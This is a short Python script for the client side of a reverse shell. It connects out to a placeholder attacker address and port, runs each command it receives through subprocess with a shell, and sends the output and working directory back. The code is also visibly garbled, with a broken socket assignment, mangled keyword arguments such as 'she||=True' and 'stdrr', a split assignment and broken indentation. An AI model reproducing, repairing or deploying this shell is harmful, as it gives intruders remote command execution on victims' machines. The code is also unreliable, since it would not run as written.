import socket
import os
import subprocess

s.socket.socket()
host = 'YOUR_IP_HERE'
port = 'YOUR_PORT_HERE'

s.connect((host, port))

while True:
  data = s.recv(1024)
  if data[:2].decode("utf-8") == 'cd':
    os.chdir(data[3:].decode("utf-8"))
    
    if len(data) > 0:
      cmd =
subprocess.Popen(data[:].decode("utf-8"), she||=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stdrr=subprocess.PIPE)
output_byte = cmd.stdout.read() + cmd.stderr.read()
output_str = str(output_byte, "utf-8")
currentWD = os.getcwd() + "> "
s.send(str.encode(output_str + currentWD))

print (output_str)
